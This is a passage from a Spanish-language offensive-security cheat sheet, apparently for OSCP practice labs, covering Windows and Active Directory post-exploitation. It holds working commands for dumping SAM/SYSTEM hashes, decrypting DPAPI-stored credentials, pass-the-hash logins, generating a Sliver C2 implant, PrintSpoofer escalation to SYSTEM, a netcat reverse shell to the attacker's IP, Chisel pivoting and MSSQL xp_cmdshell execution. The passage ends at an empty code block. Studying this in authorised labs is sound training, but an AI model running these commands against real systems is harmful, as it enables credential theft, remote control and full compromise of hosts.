> 🔴 **Lección clave: tener un privilegio "Enabled" en el token NO significa que se aplique automáticamente a cualquier comando.** `SeBackupPrivilege` solo se activa cuando usas una herramienta que invoca explícitamente la semántica de "backup" de la API de Windows — eso es lo que le dice al sistema "ignora la ACL normal, esto es una operación de respaldo". `type`, `Get-Content`, `cat`, y el `download` normal de evil-winrm NO activan esa semántica — por eso fallan o traen el archivo vacío, aunque el privilegio esté ahí.

**Solución más simple — `robocopy` con el flag `/B` (modo backup):**
```powershell
robocopy C:\Users\Administrator\Desktop C:\Users\<tu_usuario>\Documents\loot root.txt /B
```
El `/B` le dice a robocopy que use la API de backup de Windows, que SÍ respeta `SeBackupPrivilege` y copia el archivo saltándose la ACL normal del propietario.

**Luego, léelo normal desde tu propia carpeta (ya no tiene la ACL restrictiva del original):**
```powershell
type C:\Users\<tu_usuario>\Documents\loot\root.txt
```

**Alternativa con módulo dedicado** (si `robocopy /B` no coopera, o necesitas volcar algo más sensible tipo SAM/SYSTEM/NTDS):
```powershell
# Sube SeBackupPrivilegeCmdLets.dll y SeBackupPrivilegeUtils.dll (recuerda: barras "/" con upload de evil-winrm)
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\ruta\destino\root.txt
```

**Otros privilegios que aparecen junto a `SeBackupPrivilege` y para qué sirven** (útil reconocerlos en `whoami /priv`, mismo patrón: "Enabled" no basta, necesitas la herramienta correcta):
- `SeRestorePrivilege` → escribir/sobreescribir archivos saltándose ACL (complemento de Backup, para escalar más allá de solo leer).
- `SeLoadDriverPrivilege` → cargar drivers en modo kernel (vector de privesc distinto, vía drivers vulnerables).
- `SeTakeOwnershipPrivilege` → tomar posesión de cualquier objeto, similar en efecto a WriteOwner en AD pero a nivel de sistema de archivos local.

---

## FASE 5g — Volcar SAM/SYSTEM LOCAL (cuando necesitas el hash NTLM, no solo el texto plano)

Caso real (máquina Cicada). A veces el lab/examen pide específicamente **el hash NTLM** de una cuenta local (no la flag en texto, no una password de dominio) — típicamente cuando ya tienes shell con privilegios suficientes en una máquina standalone o miembro, y quieren que demuestres que puedes extraer credenciales locales del SAM.

```powershell
# Desde tu shell de Windows (necesitas privilegios de admin local, o SeBackupPrivilege)
reg save HKLM\SAM C:\ruta\sam.bak
reg save HKLM\SYSTEM C:\ruta\system.bak
```
`SYSTEM` contiene la "bootKey" necesaria para descifrar los hashes guardados en `SAM` — por eso necesitas AMBOS archivos, uno sin el otro no sirve.

```powershell
# Tráelos a tu Kali (recuerda el bug de barras de evil-winrm: usa "/" si hace falta)
download sam.bak
download system.bak
```

```bash
# En Kali, decodifica localmente — "LOCAL" al final le dice a secretsdump que
# no se conecte a nada por red, que lea los archivos que le diste
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```
**Resultado:** hashes NTLM de TODAS las cuentas locales de esa máquina (`Administrator`, `Guest`, etc.), en el formato `usuario:RID:LMHASH:NTHASH:::` — el `NTHASH` (la segunda parte larga) es lo que normalmente pide el lab/examen.

> Esta es una técnica DISTINTA a DCSync (Fase 9) — DCSync te da hashes del DOMINIO completo vía replicación; esto te da hashes LOCALES de una sola máquina, sin necesitar ningún privilegio de dominio ni edge de BloodHound, solo acceso de administrador local (o `SeBackupPrivilege`, que es justo lo que permite el `reg save` saltándose la ACL normal — mismo privilegio de la Fase 5e, aplicado aquí a claves del registro en vez de archivos).

---

## FASE 5h — DPAPI: extraer credenciales guardadas de Windows (Credential Manager)

Caso real (máquina Puppy). Cuando un usuario guarda una credencial en Windows (ej: "Remember my password" en un login de red, o `cmdkey`/Credential Manager), Windows la cifra con **DPAPI** (Data Protection API) y la guarda en disco — pero cifrada con una clave que a su vez está cifrada con la password del propio usuario. Son DOS archivos distintos los que necesitas, de DOS carpetas distintas:

```powershell
# 1. Los blobs de credenciales cifradas (lo que quieres descifrar)
dir C:\Users\<usuario>\AppData\Local\Microsoft\Credentials\ -Force
dir C:\Users\<usuario>\AppData\Roaming\Microsoft\Credentials\ -Force
# -Force es NECESARIO: estas carpetas y sus archivos suelen tener atributos
# Hidden + System, Get-ChildItem normal no los muestra.

# 2. La "masterkey" que descifra esos blobs — en una carpeta DISTINTA
dir C:\Users\<usuario>\AppData\Roaming\Microsoft\Protect\<SID_DEL_USUARIO>\ -Force
# Dentro hay un archivo con nombre tipo GUID (ej: 0a1b2c3d-...) — esa es la masterkey cifrada.
```

**Necesitas el SID del usuario para la ruta de la masterkey** (el nombre de la carpeta dentro de `Protect\`):
```powershell
whoami /user
# o: wmic useraccount where name='<usuario>' get sid
```

### Traer ambos archivos a Kali

> 🔴 **Bug real de evil-winrm con estos archivos — `Error: Download failed. Check filenames or paths: uninitialized constant WinRM::FS::FileManager::EstandardError`** — esto NO es un error tuyo de sintaxis ni de ruta. Es un bug confirmado dentro del propio código de evil-winrm (un typo real: `EstandardError` en vez de `StandardError`) que se dispara específicamente al intentar descargar archivos con atributos **Hidden + System** (justo lo que son los blobs de credenciales y las masterkeys). `Copy-Item` a una ruta sin esos atributos antes de descargar puede ayudar, pero no es 100% confiable. **La solución que sí funciona de forma consistente: usar Sliver C2 en vez de evil-winrm para este paso puntual** (ver Fase 6b) — su comando `download` no tiene este bug.

### Descifrar con impacket-dpapi

```bash
# 1. Descifrar la masterkey (necesitas la password en texto plano del usuario dueño)
impacket-dpapi masterkey -file '<archivo_masterkey_GUID>' -sid '<SID_DEL_USUARIO>' -password '<password_del_usuario>'
# Output: una "decrypted key" en hex — esa es la clave real que descifra los blobs.
```

```bash
# 2. Con la masterkey ya descifrada (el hex del paso anterior), descifrar el blob de credencial
impacket-dpapi credential -file '<archivo_blob_de_Credentials>' -key '<hex_de_la_masterkey_descifrada>'
# Output: usuario y password en texto plano guardados originalmente en Credential Manager.
```

> Si el usuario dueño de la masterkey tiene cuenta de **dominio** (no local), también puedes descifrar la masterkey con la clave de respaldo del DC (`-pvk`) en vez de la password del usuario — útil si no conoces esa password en texto plano pero sí tienes privilegios de dominio suficientes para extraer la domain backup key. Esto no fue necesario en el caso real (sí se tenía la password del usuario), pero es la alternativa documentada por impacket para este mismo comando.

> **Cuándo pensar en DPAPI:** viste en BloodHound o por enumeración que un usuario tiene `GenericAll`/edges hacia otro, entraste con su shell, y en vez de una flag directa encontraste carpetas `Credentials\` o `Protect\` con contenido — es señal de que ese usuario guardó credenciales de OTRA cuenta en el Credential Manager de Windows, y esa es la cred que realmente necesitas para seguir la cadena.

---

## FASE 6 — Movimiento lateral

```bash
# ANTES de elegir herramienta, confirma qué puerto está abierto
nmap -p445,5985,5986 <IP>
```

```bash
# Si 5985/5986 (WinRM) abierto → evil-winrm
evil-winrm -i <IP> -u <user> -p <pass>
evil-winrm -i <IP> -u <user> -H <NT_HASH>          # Pass-the-Hash

# Si 5985 CERRADO pero 445 abierto → impacket-psexec o wmiexec
impacket-psexec  <dominio>/<user>:<pass>@<IP>      # crea un servicio (más ruidoso)
impacket-wmiexec <dominio>/<user>:<pass>@<IP>      # vía WMI (más discreto)
```

> 🔴 **Señal de alerta #1 — `Errno::ECONNREFUSED` en 5985:** el puerto está cerrado. Cambia inmediatamente a psexec/wmiexec, no reintentes evil-winrm.

> 🔴 **Señal de alerta #2 — WinRM conecta (ves el prompt `PS C:\>`) pero CUALQUIER comando da `WinRMAuthorizationError`:** hay AL MENOS DOS causas distintas con el mismo síntoma — no asumas cuál es sin verificar:
> 1. **El usuario NO está en el grupo "Remote Management Users"** (visto en Forest con `svc-alfresco`, y en Sauna). Solución: si tienes un ACL útil (GenericWrite/GenericAll sobre un grupo), agrégate tú mismo a "Remote Management Users", o al grupo correspondiente.
> 2. **La cuenta tiene la bandera `ACCOUNTDISABLE` activa en su `userAccountControl`** (visto en Puppy con `adam.silver`) — aunque esté en el grupo correcto, una cuenta deshabilitada da exactamente el mismo error. Verifica primero con `whoami /groups` desde OTRA cuenta que sí tenga acceso (ver Fase 6, "cuando una cuenta no funciona, lee de otra con permiso"), y si sospechas esto, quítale la bandera con `bloodyAD`:
>    ```bash
>    bloodyAD --host <IP> -d <dominio> -u '<tu_usuario>' -p '<tu_pass>' remove uac '<cuenta_objetivo>' -f ACCOUNTDISABLE
>    ```
>    (requiere que tengas GenericWrite/GenericAll sobre esa cuenta — el mismo tipo de ACL que te permitiría resetear su password)
>
> Prueba con SMB (psexec/wmiexec) en su lugar si no logras resolverlo por ninguna de las dos vías; si SMB también rechaza (`STATUS_LOGON_FAILURE`), no es autorización, son las credenciales (ver alerta #3).

> 🔴 **Señal de alerta #3 — 2+ protocolos distintos (SMB, LDAP, WinRM) rechazan la MISMA credencial de forma consistente con LOGON_FAILURE:** sospecha del dato copiado, no de la configuración. Reescribe usuario Y password a mano.

> 🔴 **Señal de alerta #4 — `--local-auth`:** si sospechas que la cuenta es LOCAL de la máquina (no de dominio), prueba:
> ```bash
> nxc smb <IP> -u '<user>' -p '<pass>' --local-auth
> nxc winrm <IP> -u '<user>' -p '<pass>' --local-auth
> ```
> Si Kerberos da `KDC_ERR_C_PRINCIPAL_UNKNOWN (Client not found in Kerberos database)`, el principal no existe como cuenta de DOMINIO con ese nombre exacto — verifica el username (ver Fase 7).

---

## FASE 6b — Sliver C2 como alternativa a evil-winrm (cuando `download`/`upload` fallan)

Caso real (máquina Puppy). Cuando evil-winrm falla de forma consistente para transferir un archivo específico (típicamente por el bug `EstandardError` con Hidden+System, Fase 5h), **Sliver** es un framework C2 que puede sustituir completamente a evil-winrm como shell — su implante es más robusto para este tipo de operaciones de archivo. No es exclusivo para esto (es un C2 completo), pero aquí se documenta el flujo mínimo para usarlo solo como "shell alternativa para un download problemático".

> Confusión real de nombre: es **Sliver** (el framework), no "Silver" — no tiene relación con ningún usuario que se llame parecido en la máquina.

### Instalación — dos binarios, no uno

```bash
sudo apt install sliver -y
which sliver
# → no existe ningún comando "sliver" unificado. El paquete instala DOS binarios
# separados: sliver-server y sliver-client. Usa esos nombres exactos.
```

### Levantar el servidor y crear un operador (necesario para que el cliente conecte)

```bash
# 1. Arranca el servidor (deja esta terminal abierta, es su consola interactiva)
sudo sliver-server
```

```bash
# 2. DESDE OTRA terminal, genera un perfil de "operador" — sliver-client no conecta
#    sin esto, y falla con "No config files found" si lo omites.
#    --permissions es OBLIGATORIO (valores válidos: all, builder, crackstation)
sudo sliver-server operator --name <tu_nombre> --lhost localhost --save /tmp/operator.cfg --permissions all

# El archivo queda con permisos root-only porque se generó con sudo — dale lectura:
sudo chmod +r /tmp/operator.cfg
```

```bash
# 3. DENTRO de la consola de sliver-server (la terminal del paso 1), activa el
#    listener multiplayer — sin esto, sliver-client falla con
#    "Connection to server failed: context deadline exceeded" aunque el config esté bien.
multiplayer
```

```bash
# 4. Ahora sí, conecta el cliente usando el config generado
sliver-client /tmp/operator.cfg
```

### Generar el implante y levantar un listener para recibir la conexión

```bash
# Dentro de la consola de sliver-client/sliver-server:

# Listener mTLS — usa tu IP de la VPN (tun0), NO tu IP de red local
mtls --lhost <TU_IP_TUN0>

# Genera el implante apuntando a ese listener
generate --mtls <TU_IP_TUN0> --save /tmp/implante.exe
```

> 🔴 **El `.exe` generado queda root-only si corriste `sliver-server` con `sudo`** — igual que `operator.cfg`, necesita `chmod +r` antes de poder leerlo/subirlo:
> ```bash
> sudo chmod +r /tmp/implante.exe
> ```

```bash
# Sube el implante a la máquina objetivo (vía el evil-winrm que SÍ funciona para
# archivos normales, o vía el share que ya tengas) y ejecútalo ahí:
```
```powershell
C:\ruta\implante.exe
```

> 🔴 **Si no aparece ninguna sesión tras ejecutar el implante, revisa primero que el listener `mtls` esté activo** (`mtls --lhost <IP>` corrido ANTES de ejecutar/re-ejecutar el implante) — sin listener, el implante se ejecuta pero no tiene a dónde conectar, y no da ningún error visible en Windows.

### Interactuar con la sesión y usar `download`

```bash
# Dentro de la consola de Sliver:
sessions                    # lista sesiones activas, con su ID
use <SESSION_ID>             # entra a interactuar con una sesión específica

# Ya dentro de la sesión, el equivalente a evil-winrm download:
download 'C:\Users\<usuario>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>' /ruta/local/destino/
```
Este `download` de Sliver maneja bien archivos Hidden+System — es justo la razón por la que se usa aquí en vez de evil-winrm.

> 🔴 **Si el implante se mata (`Stop-Process -Name <implante> -Force` en PowerShell, o el proceso termina por cualquier razón), se cierran TODAS las sesiones de Sliver asociadas a ese proceso** — no solo la que tenías abierta. Tienes que volver a ejecutar el `.exe` en Windows para obtener una sesión nueva. Evita matar el proceso del implante a propósito salvo que ya hayas terminado con él.

> 🔴 **Sesiones duplicadas con el mismo timestamp:** si el implante se ejecuta más de una vez (ej: por error, o porque un script lo relanza), Sliver muestra varias sesiones separadas aunque sean "la misma" conexión lógica — usa `sessions` para ver cuál sigue viva y cuál ya murió antes de hacer `use`.

---

## FASE 6c — Privesc local a SYSTEM: `SeImpersonatePrivilege` + PrintSpoofer

Caso real (Challenge Lab OSCP A, máquina MS01). Esto es DISTINTO a todo lo visto hasta ahora en esta guía — no es un ataque de AD (no toca Kerberos, LDAP, ni ACLs del dominio), es **escalada de privilegios LOCAL en una sola máquina Windows**, y reaparece constantemente en el examen real porque Windows le da este privilegio a muchas cuentas de servicio/aplicación sin que nadie se dé cuenta del riesgo.

**Por qué funciona — el concepto:** `SeImpersonatePrivilege` le permite a tu proceso "impersonar" (tomar la identidad) de cualquier cliente que se conecte a él — **incluyendo SYSTEM**, si logras que un proceso SYSTEM se conecte a algo que tú controlas. La familia de exploits "Potato" (PrintSpoofer, GodPotato, RoguePotato, JuicyPotato) automatiza esto: engañan a un servicio SYSTEM (el spooler de impresión, DCOM, BITS...) para que se autentique contra un named pipe que tú creaste, y usan tu privilegio para capturar ese token de SYSTEM.

**Primera pista — revisa SIEMPRE `whoami /priv` apenas tengas shell, antes de cualquier otra cosa:**
```powershell
whoami /priv
```
Busca `SeImpersonatePrivilege` con estado `Enabled`. Es extremadamente común en cuentas de servicio y cuentas bajo las que corre una aplicación web (IIS, Apache con un usuario dedicado, etc.) — exactamente el perfil de una cuenta como `Eric.Wallows` en un escenario de "assumed breach".

**Explotación con PrintSpoofer (abusa el servicio Spooler de impresión, casi siempre activo):**
```bash
# Descárgalo en Kali (binario público, PoC bien documentado — permitido en el examen
# igual que Certipy o impacket, no es un framework de explotación automatizada):
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
# Alternativa si esa URL cambia de nombre:
wget https://github.com/jakobfriedl/precompiled-binaries/raw/main/PrintSpoofer64.exe
```
```
upload PrintSpoofer64.exe
```
```powershell
.\PrintSpoofer64.exe -i -c cmd
```

> 🔴 **El `cmd` interactivo que lanza NO sirve sobre evil-winrm** — evil-winrm no tiene un pty real, así que el proceso se crea y queda vivo en el sistema, pero tú vuelves inmediatamente al prompt de PowerShell normal sin poder escribirle. No es que el exploit haya fallado (`CreateProcessAsUser() OK` confirma que SÍ obtuviste el token de SYSTEM) — es una limitación de la shell, no del exploit.

**Solución — ejecuta comandos puntuales como SYSTEM, redirigiendo la salida a un archivo que luego lees tú mismo:**
```powershell
.\PrintSpoofer64.exe -c "cmd /c whoami > C:\Users\<tu_usuario>\Documents\out.txt 2>&1"
Start-Sleep -Seconds 2
type C:\Users\<tu_usuario>\Documents\out.txt
```
Debe mostrar `nt authority\system`.

> 🔴 **`Start-Sleep` es obligatorio, no cosmético:** `CreateProcessAsUser()` lanza el proceso y PrintSpoofer regresa el control a tu shell de inmediato, SIN esperar a que el proceso termine de escribir el archivo. Si haces `type` sin pausa, el archivo todavía no existe o está vacío. 2 segundos suelen bastar para un comando simple; si el comando tarda más (ej: `dir /s` en un árbol grande), sube el sleep.

> 🔴 **Usa SIEMPRE una ruta de tu propio usuario (`C:\Users\<tu_usuario>\Documents\`), NUNCA `C:\Windows\Temp\` para el archivo de salida que vas a leer después.** SYSTEM sí puede escribir en `C:\Windows\Temp\`, pero el archivo queda con una ACL que tu usuario normal no puede leer después — te da `Access is denied` al intentar el `type`, aunque el comando como SYSTEM haya funcionado perfecto. En tu propia carpeta, como ya tienes permisos completos, no hay ese problema.

**Para una shell de SYSTEM real e interactiva (si necesitas hacer varias cosas, no solo un comando puntual):**
```bash
# En Kali:
sudo nc -lvnp 4444
```
```powershell
.\PrintSpoofer64.exe -c "C:\ruta\nc64.exe -e cmd.exe <TU_IP_VPN> 4444"
```

**Por qué esto vale la pena documentar aparte de todo lo de AD:** una vez tienes SYSTEM, tienes acceso de lectura TOTAL al sistema de archivos local — útil no solo para leer flags de cualquier usuario, sino para la Fase 6e (leer código fuente de apps web en busca de credenciales) y para extraer SAM/SYSTEM/SECURITY locales (Fase 5g) sin depender de ningún privilegio de dominio.

---

## FASE 6d — Pivoting a una segunda red con Chisel + proxychains

Caso real (Challenge Lab OSCP A). Esto aplica cuando enumeras la red y encuentras una máquina con **dos tarjetas de red** (dual-homed) — una en tu subred, otra en una subred interna a la que no tienes ruta directa (típicamente donde vive el DC en un set de AD). La máquina dual-homed es tu **pivote**: necesitas que TU tráfico pase a través de ELLA para llegar a la segunda red.

**Primero, confirma que la máquina es dual-homed:**
```powershell
ipconfig /all
```
Busca una SEGUNDA interfaz con IP en un rango distinto al que ya conoces (ej: tienes shell en `192.168.x.x` y ves también una interfaz en `10.10.x.x`). El `DNS Servers` de esa segunda interfaz suele ser el DC de esa red.

**Concepto de Chisel:** el cliente (que corre en la máquina pivote, dentro de la red Windows) abre una conexión SALIENTE hacia tu Kali. Por ese mismo canal, levantas un proxy SOCKS del lado de tu Kali. Así, cualquier herramienta tuya (nxc, impacket, bloodhound-python) puede alcanzar la segunda red como si estuvieras ahí, aunque tu Kali no tenga ruta real — todo pasa por el túnel.

```bash
# 1. Instala/descarga Chisel — necesitas DOS binarios: uno Linux (tu Kali), uno Windows (la víctima)
sudo apt install chisel -y
# Si no está en apt, o necesitas el binario de Windows:
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gunzip chisel_1.9.1_windows_amd64.gz
mv chisel_1.9.1_windows_amd64 chisel.exe
chmod +x chisel.exe
```
```bash
# 2. Levanta el servidor en tu Kali
chisel server -p 8000 --reverse
```
```
upload chisel.exe
```
```powershell
# 3. Cliente en la víctima, apuntando a TU IP real de VPN (no un placeholder — verifícala con "ip a | grep tun0")
.\chisel.exe client <TU_IP_VPN_REAL>:8000 R:socks
```
> Si ya tienes SYSTEM por la Fase 6c, puedes lanzar esto vía `PrintSpoofer64.exe -c "..."` igual que cualquier otro comando, aunque para el túnel en sí el nivel de privilegio no es lo crítico — lo que importa es que la máquina pueda alcanzar la red interna.

**4. Confirma la conexión en la terminal donde corre `chisel server`** — debe aparecer algo como:
```
server: session#1: tun: proxy#1:R:127.0.0.1:1080=>socks: Listening
```
Si no aparece nada, el cliente no conectó — revisa que usaste tu IP real, no un placeholder.

**5. Configura proxychains (`/etc/proxychains4.conf`), reemplazando la línea default de Tor por la tuya:**
```
# comenta o borra esta línea:
#socks4  127.0.0.1 9050
# y agrega:
socks5 127.0.0.1 1080
```

**6. Antepone `proxychains` a CUALQUIER herramienta que necesite llegar a la red interna:**
```bash
proxychains nxc smb 10.10.x.x
proxychains impacket-GetUserSPNs ...
```

### 🔴 Limitaciones del túnel que cuestan tiempo si no las conoces

**UDP no se tuneliza — solo TCP.** Dos consecuencias prácticas:
- `ntpdate` (para sincronizar reloj, Fase 8/checklist #12) usa NTP sobre UDP → falla por timeout a través de proxychains. **Solución:** usa `faketime` con un offset calculado a mano a partir de un desfase ya conocido (ej: el que viste en un `ssl-date` de nmap contra otra máquina del mismo lab), o un timestamp absoluto:
  ```bash
  TS=$(date -d '+7 hours' '+%Y-%m-%d %H:%M:%S')
  faketime "$TS" proxychains impacket-GetUserSPNs ...
  ```
  (`faketime '+7h'` directo puede fallar con "invalid date" según la versión — el timestamp absoluto calculado con `date -d` es más confiable.)
- `bloodhound-python` resuelve registros SRV por DNS sobre UDP por defecto → falla con `dns.resolver.LifetimeTimeout`. **Solución:** fuerza DNS sobre TCP con el flag `--dns-tcp`:
  ```bash
  proxychains bloodhound-python -u <user> -p '<pass>' -d <dominio> -ns <IP_DC> -c all --zip --dns-tcp
  ```
- Para resolver un hostname puntual (ej: averiguar la IP de otra máquina del dominio por su nombre), usa `dig +tcp` en vez de `dig`/`nslookup` normal:
  ```bash
  proxychains dig +tcp <hostname> @<IP_DC>
  ```

**`nmap` sobre proxychains da falsos negativos.** `nmap` (sobre todo con `--min-rate` alto) abre muchas conexiones en paralelo con sockets no bloqueantes, y proxychains-ng no los maneja bien a través de un solo canal SOCKS — el resultado puede decir "todos los puertos filtered" aunque estén abiertos. **No confíes en ese resultado.** Verifica con herramientas de una sola conexión TCP limpia:
```bash
proxychains nxc smb <IP>              # confirma 445 de forma confiable
proxychains nc -nvz -w5 <IP> <puerto> # confirma cualquier puerto puntual
```
Si necesitas igual usar nmap, bájale mucho la velocidad y limita los puertos: `nmap -sT -Pn -T2 --max-retries 1 -p <puertos_específicos> <IP>` — reduce falsos negativos pero no los elimina del todo; `nc`/`nxc` siguen siendo más confiables.

---

## FASE 6e — Credenciales en código fuente de apps web + privesc en MSSQL (impersonation)

Caso real (Challenge Lab OSCP A). Dos técnicas que se encadenan naturalmente cuando ya tienes SYSTEM en una máquina que corre una app web custom (Fase 6c) y necesitas credenciales para seguir avanzando hacia otra máquina (ej: un servidor MSSQL).

### Localizar el código fuente de la app

Un banner de nmap tipo `Apache httpd (Win64) PHP/...` en Windows casi siempre es **WAMP** o **XAMPP**, no IIS — no asumas la ruta, confírmala:
```powershell
# Busca un archivo HTML que ya sepas que existe (visto antes con feroxbuster, por ejemplo)
where /r C:\ Home.html
# o busca el archivo de configuración de Apache directamente
where /r C:\ httpd.conf
```
Con la ruta del `httpd.conf`, lee el archivo de vhosts (`conf\extra\httpd-vhosts.conf` en la misma instalación) — ahí ves el `DocumentRoot` EXACTO de cada sitio/puerto, que puede no ser el mismo directorio para todos los puertos de Apache en la misma máquina (ej: puerto 80 → `C:\wamp64\www`, puerto 81 → `C:\wamp64\attendance`, dos apps completamente distintas).

### Buscar credenciales en el código

```powershell
# Busca archivos de conexión a BD por nombre típico, y por contenido
dir C:\wamp64\<carpeta_app> /s /b
findstr /si /m password C:\wamp64\<carpeta_app>\*.php
type C:\wamp64\<carpeta_app>\conn.php
```

> **Las credenciales que encuentres aquí pueden ser para una base de datos LOCAL** (ej: `mysqli('localhost', 'root', '', 'apsystem')` — root local sin password, para MySQL/MariaDB corriendo en la misma máquina), que no sirve directo para moverte a otra máquina, pero sí es una mina de passwords para probar por **reutilización** contra cuentas reales de dominio: vuelca las tablas de usuarios/admin de esa base de datos local, y prueba cualquier password que encuentres contra las cuentas de AD que aún no tengas (ej: una cuenta "admin" del panel web con el mismo password que el usuario de dominio del mismo nombre).

```powershell
# Ubica el binario de mysql/mariadb (WAMP trae ambos, confirma cuál aplica)
where /r C:\wamp64 mysql.exe
# Vuelca las tablas de la BD de la app
<ruta_mysql.exe> -u root <nombre_bd> -e "show tables;"
<ruta_mysql.exe> -u root <nombre_bd> -e "SELECT * FROM <tabla_admin>;"
```

### MSSQL — cadena de impersonation (`EXECUTE AS`) cuando tu cuenta no es sysadmin

Si en vez de (o además de) MySQL local encuentras un servidor **MSSQL** (puerto 1433, típicamente revelado por un SPN tipo `MSSQL/<host>.dominio` en un Kerberoast — Fase 5), conéctate con tus credenciales de dominio vía autenticación integrada de Windows:

```bash
proxychains impacket-mssqlclient <dominio>/<user>:'<pass>'@<IP> -windows-auth
```

> ⚠️ **`impacket-mssqlclient` ejecuta cada LÍNEA como un comando independiente** — no acumula un query multi-línea como un editor SQL normal. Cualquier query debe ir TODO en una sola línea.

Verifica primero tu nivel real:
```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```
Si da `0`, no eres sysadmin — pero antes de abandonar esa cuenta, revisa si puedes **impersonar** a otro login sin necesitar su password (el equivalente en MSSQL a un ACL de AD, pero dentro del motor de base de datos):

```sql
SELECT a.name AS login_con_permiso, b.name AS puede_impersonar_a FROM sys.server_permissions AS perm INNER JOIN sys.server_principals AS a ON perm.grantee_principal_id = a.principal_id INNER JOIN sys.server_principals AS b ON perm.grantor_principal_id = b.principal_id WHERE perm.permission_name = 'IMPERSONATE';
```
Esto te muestra TODOS los permisos de impersonation del servidor, aunque no tengas visibilidad completa de otros principals por separado. Si tu login aparece con `puede_impersonar_a` algo jugoso (ej: `sa`):
```sql
EXECUTE AS LOGIN = '<login_objetivo>';
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Si da vacío/nada útil, revisa también qué heredas de tus propios grupos de Windows — una cuenta de dominio autenticada vía `-windows-auth` hereda permisos de TODOS los grupos de AD a los que pertenece, no solo los suyos directos:
```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM sys.login_token;
```
`sys.login_token` lista cada grupo de Windows detrás de tu sesión — si alguno de esos grupos (ej: un grupo custom como `admin`, `IT` que viste en LDAP) tiene sysadmin otorgado a nivel de MSSQL, aparece aquí aunque tu usuario individual no tenga nada directo.

**Una vez confirmado sysadmin (por cualquiera de las dos vías), RCE vía `xp_cmdshell`:**
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

---

## FASE 7 — Enumeración nativa desde dentro (RDP + PowerShell/.NET, sin nxc/impacket)

Útil cuando: el firewall solo deja pasar RDP/WinRM (no SMB/RPC desde fuera), o ya tienes shell y quieres enumerar sin depender de herramientas externas ni dejar binarios en disco.

```bash
xfreerdp /u:<user> /d:<dominio> /v:<IP_cliente> +clipboard
# Si da error de Kerberos "Cannot contact any KDC", agrega el DC a tu /etc/hosts (Fase 0)
```

```cmd
:: Usuarios y grupos DEL DOMINIO (no confundir con los locales de abajo)
net user /domain
net group "Domain Admins" /domain

:: Usuarios y grupos LOCALES de la máquina donde estás parado (¡distinto!)
net user
net localgroup administrators
```
> 🔴 **Confusión real:** `net user` (sin `/domain`) solo muestra cuentas LOCALES de esa máquina, no del dominio.

### PowerShell + .NET classes — construir la ruta LDAP dinámicamente

**Por qué esto existe cuando `nxc smb <IP>` ya te dice el dominio:** `nxc` te **informa un dato** para que tú lo leas; este script **construye una variable utilizable dentro de la misma sesión de PowerShell** que puedes encadenar directo en la siguiente consulta, sin copiar/pegar el nombre del dominio a mano cada vez. Es la diferencia entre que te digan el dato y que el script se autoconfigure con él para seguir trabajando. Vale la pena cuando vas a hacer VARIAS consultas LDAP seguidas desde la misma shell, o cuando SMB/RPC no son alcanzables desde tu Kali pero sí tienes shell dentro de la red del dominio.

```powershell
# 1. Obtener el PDC dinámicamente (sin hardcodear el nombre del dominio)
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name

# 2. Obtener el DN del dominio en formato LDAP (DC=corp,DC=com), vía ADSI con comillas vacías
#    (comillas vacías = empezar desde la raíz de la jerarquía de AD)
$DN = ([adsi]'').distinguishedName

# 3. Ensamblar la ruta LDAP completa
$LDAP = "LDAP://$PDC/$DN"
$LDAP   # imprime para verificar, ej: LDAP://DC1.corp.com/DC=corp,DC=com
```

```powershell
# Con $LDAP ya armado, reutilízalo en cualquier consulta con filtro:
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$LDAP)
$searcher.Filter = "(objectClass=user)"
$searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"] }

# Cambia solo el .Filter para otras consultas, reutilizando el mismo $searcher/$LDAP:
$searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*))"   # Kerberoastable
$searcher.Filter = "(objectClass=computer)"                           # computadoras
$searcher.Filter = "(objectClass=group)"                              # grupos
```

> Requiere PowerShell, NO cmd.exe. Si tu prompt dice `C:\Users\...>` sin "PS" adelante, escribe `powershell` primero. Si el script da error de política de ejecución, usa `powershell -ep bypass` antes de correrlo.

### PowerView (alternativa cuando no quieres escribir tus propios filtros LDAP)

Hace gran parte de lo que BloodHound muestra visualmente, pero en PowerShell puro, sin necesitar subir binarios pesados ni tener Neo4j/Postgres corriendo — útil como plan B si BloodHound no es viable por tiempo o por restricciones de red en el examen.

```powershell
. .\PowerView.ps1    # cárgalo primero (recuerda subirlo con barras "/" si usas evil-winrm upload)

Get-NetUser                          # equivalente a enumerar usuarios
Get-NetGroup "Domain Admins"         # miembros de un grupo
Get-NetComputer                      # computadoras del dominio
Find-LocalAdminAccess                # dónde tienes admin local, sin BloodHound
Get-ObjectAcl -Identity <usuario>    # permisos ACL sobre un objeto (equivalente a un edge de BloodHound)
```

---

## FASE 7b — WinPEAS y post-explotación (encontrar credenciales de autologin, privesc)

```bash
# En Kali: sirve winPEAS desde la carpeta CORRECTA donde está el binario
find / -iname "winPEAS*" 2>/dev/null
# En Kali suele venir preinstalado en /usr/share/peass/winpeas/

cd /usr/share/peass/winpeas/    # ¡MUÉVETE A ESA CARPETA! No sirvas desde ~/
python3 -m http.server 80
```

> 🔴 **Error real — 404 al descargar:** corriste `http.server` desde tu `~` (home), pero el archivo estaba en `/usr/share/peass/winpeas/`. Verifica siempre con `curl -s http://localhost:80/winPEASx64.exe -o /dev/null -w "%{http_code}\n"` (debe dar 200) ANTES de intentar la descarga desde Windows.

> 🔴 **Error real — "Unable to connect to the remote server" al descargar desde Windows:** usaste tu IP de red LOCAL de VMware (`192.168.x.x`), no tu IP de la VPN del lab. La máquina objetivo solo puede alcanzar tu interfaz `tun0`:
> ```bash
> ip a | grep tun0 -A2   # busca la IP 10.x.x.x, esa es la correcta para el target
> ```

```powershell
